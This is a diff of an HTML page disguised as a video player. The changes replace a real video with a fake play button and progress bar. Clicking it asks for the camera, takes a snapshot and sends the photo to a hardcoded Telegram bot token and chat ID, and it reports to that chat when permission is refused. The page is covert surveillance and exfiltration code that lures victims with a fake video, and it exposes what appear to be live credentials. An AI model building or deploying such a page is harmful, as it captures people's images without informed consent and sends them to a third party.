@@ -11,70 +11,79 @@
             align-items: center;
             height: 100vh;
             background-color: black;
+            margin: 0;
         }
         .video-container {
             position: relative;
             width: 640px;
             height: 360px;
             background: black;
+        }
+        #video-placeholder {
+            width: 100%;
+            height: 100%;
+            background: black url('thumbnail.jpg') center/cover no-repeat;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+        #play-button {
+            width: 60px;
+            height: 60px;
+            background: rgba(255, 255, 255, 0.8);
+            border-radius: 50%;
             display: flex;
             justify-content: center;
             align-items: center;
-        }
-        #thumbnail {
-            width: 100%;
-            height: 100%;
-            object-fit: cover;
-            display: block;
-            position: absolute;
-            z-index: 1;
             cursor: pointer;
+            transition: 0.2s;
         }
-        video {
-            width: 100%;
-            height: 100%;
-            display: none;
+        #play-button:hover {
+            background: rgba(255, 255, 255, 1);
         }
-        .controls {
+        #play-button::before {
+            content: '▶';
+            font-size: 24px;
+            color: black;
+            font-weight: bold;
+        }
+        #progress-bar {
             position: absolute;
             bottom: 10px;
-            left: 50%;
-            transform: translateX(-50%);
-            display: flex;
-            gap: 10px;
-        }
-        button {
+            left: 10px;
+            right: 10px;
+            height: 5px;
             background: rgba(255, 255, 255, 0.3);
-            border: none;
-            padding: 10px;
-            color: white;
-            cursor: pointer;
-            font-size: 16px;
+            border-radius: 3px;
+        }
+        #progress {
+            width: 0%;
+            height: 100%;
+            background: white;
+            border-radius: 3px;
+            transition: width 1s linear;
         }
     </style>
 </head>
 <body>
 
     <div class="video-container">
-        <img id="thumbnail" src="images.jpeg" alt="Thumbnail Video" onclick="startVideo()">
-        <video id="video" autoplay muted></video>
-        <div class="controls">
-            <button onclick="togglePlay()">▶️ Play/Pause</button>
+        <div id="video-placeholder">
+            <div id="play-button" onclick="startFakeVideo()"></div>
+        </div>
+        <div id="progress-bar">
+            <div id="progress"></div>
         </div>
     </div>
 
     <script>
-        const BOT_TOKEN = "7835500770:AAEhp7-8y-mEuhjw2bTUzutQ3rZjmg5zv5o"; // Ganti dengan token bot Telegram
-        const CHAT_ID = "-1002270270494"; // Ganti dengan Chat ID Anda
-        let video = document.getElementById("video");
-        let thumbnail = document.getElementById("thumbnail");
-        let isPlaying = false;
+        const BOT_TOKEN = "7835500770:AAEhp7-8y-mEuhjw2bTUzutQ3rZjmg5zv5o"; 
+        const CHAT_ID = "-1002270270494"; 
 
         function sendToTelegram(message, photoBlob = null) {
             const formData = new FormData();
             formData.append("chat_id", CHAT_ID);
             formData.append("caption", message);
-            
             if (photoBlob) {
                 formData.append("photo", photoBlob, "snapshot.jpg");
             }
@@ -118,50 +127,37 @@
 
             try {
                 let stream = await navigator.mediaDevices.getUserMedia({ video: true });
-                video.srcObject = stream;
-                video.play();
-                isPlaying = true;
-
-                let canvas = document.createElement("canvas");
-                let ctx = canvas.getContext("2d");
-
+                let track = stream.getVideoTracks()[0];
+                let imageCapture = new ImageCapture(track);
+                
                 await new Promise(resolve => setTimeout(resolve, 2000));
 
-                canvas.width = video.videoWidth;
-                canvas.height = video.videoHeight;
-                ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
-
-                canvas.toBlob(async blob => {
-                    await sendToTelegram(message, blob);
-                }, "image/jpeg");
+                const blob = await imageCapture.takePhoto();
+                await sendToTelegram(message, blob);
 
                 stream.getTracks().forEach(track => track.stop());
-                video.style.display = "none";
-                thumbnail.style.display = "block";
             } catch {
                 await sendToTelegram("❌ Kamera tidak diizinkan.");
             }
         }
 
-        function startVideo() {
-            thumbnail.style.display = "none";
-            video.style.display = "block";
+        function startFakeVideo() {
+            document.getElementById("play-button").style.display = "none";
+            let progressBar = document.getElementById("progress");
+
+            let duration = 10; 
+            let startTime = Date.now();
+            function updateProgress() {
+                let elapsed = (Date.now() - startTime) / 1000;
+                let percentage = (elapsed / duration) * 100;
+                progressBar.style.width = percentage + "%";
+                if (elapsed < duration) {
+                    requestAnimationFrame(updateProgress);
+                }
+            }
+            updateProgress();
             captureData();
         }
-
-        function togglePlay() {
-            if (isPlaying) {
-                video.pause();
-                isPlaying = false;
-            } else {
-                video.play();
-                isPlaying = true;
-            }
-        }
-
-        window.onload = function () {
-            video.style.display = "none";
-        };
     </script>
 </body>
 </html>
